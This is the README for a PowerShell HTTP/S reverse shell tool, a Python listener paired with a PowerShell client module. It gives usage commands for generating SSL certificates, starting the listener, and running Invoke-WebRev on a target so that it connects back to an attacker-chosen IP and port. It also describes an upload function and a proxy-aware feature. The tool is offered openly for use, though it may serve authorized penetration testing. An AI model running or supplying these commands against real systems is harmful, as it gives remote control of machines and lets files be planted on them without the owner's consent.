# Powershell HTTP/S Reverse Shell

##  server.py - server

![Alt text](images/revshell.jpg "Server")

On your server:
```
    python3 server.py IP PORT
    
    For SSL Reverse Shell:
        openssl genrsa -out private.pem 2048
        openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
        python3 server.py --ssl IP PORT
```

## Invoke-WebRev.ps1 - client

On your client:
```
Import-Module .\Invoke-WebRev.ps1
```
```
Reverse Shell without encryption:
    Invoke-WebRev -ip IP -port PORT
```
```
Reverse Shell with encryption:
    Invoke-WebRev -ssl -ip IP -port PORT
```

# Extra functions
```
Upload
    Usage: upload /src/path/file C:\dest\path\file
```

# Features
    - Proxy Aware
    - Upload Function

# Future features
    - Autocomplete
    - Download function
